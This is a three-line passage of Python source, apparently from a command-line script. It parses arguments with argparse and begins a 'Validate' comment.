     args = ap.parse_args()
 
     # Validate
